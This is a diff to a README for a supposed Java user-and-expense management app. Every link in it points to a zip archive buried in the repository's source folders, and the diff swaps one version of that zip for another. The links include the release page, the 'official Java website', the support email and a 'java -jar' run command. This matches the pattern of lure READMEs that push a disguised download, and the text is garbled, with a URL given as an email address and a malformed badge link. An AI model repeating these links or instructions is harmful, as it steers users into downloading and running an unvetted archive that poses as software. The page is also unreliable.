@@ -1,6 +1,6 @@
 # 🎉 user-management-system - Simplifying User and Expense Management
 
-[![Download Latest Release](https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip%20Latest%https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip)](https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip)
+[![Download Latest Release](https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip%20Latest%https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip)](https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip)
 
 ## 📦 Introduction
 
@@ -12,15 +12,15 @@ To get started with the User Management System, follow the steps below to downlo
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip) to find the latest version of the application.
   
 2. **Download the Application**: Click on the download link for the latest release package. This package contains everything you need to run the system.
 
-3. **Install Java**: Ensure you have Java 11 or later installed on your computer. You can download it from the [official Java website](https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip).
+3. **Install Java**: Ensure you have Java 11 or later installed on your computer. You can download it from the [official Java website](https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip).
 
 4. **Run the Application**: Once downloaded, navigate to the folder where the application file is located. Open a command prompt (or terminal) in that folder and run the command:
    ```
-   java -jar https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip
+   java -jar https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip
    ```
    This will start the application.
 
@@ -82,8 +82,8 @@ For more detailed information about the features and functionality, check the of
 
 ## 📞 Support
 
-If you need help or have questions about the User Management System, feel free to open an issue in this repository. You can also reach out by email at https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip
+If you need help or have questions about the User Management System, feel free to open an issue in this repository. You can also reach out by email at https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip
 
 ## 🎉 Final Notes
 
-Thank you for choosing the User Management System! We hope it makes managing users and expenses easier for you. For updates, features, and improvements, keep an eye on the [Releases Page](https://raw.githubusercontent.com/hyhhyhhyhy/user-management-system/main/src/main/java/com/example/user_management/entity/system-user-management-v1.2.zip).
+Thank you for choosing the User Management System! We hope it makes managing users and expenses easier for you. For updates, features, and improvements, keep an eye on the [Releases Page](https://github.com/hyhhyhhyhy/user-management-system/raw/refs/heads/main/src/main/java/com/example/user_management/enums/system_management_user_1.4.zip).
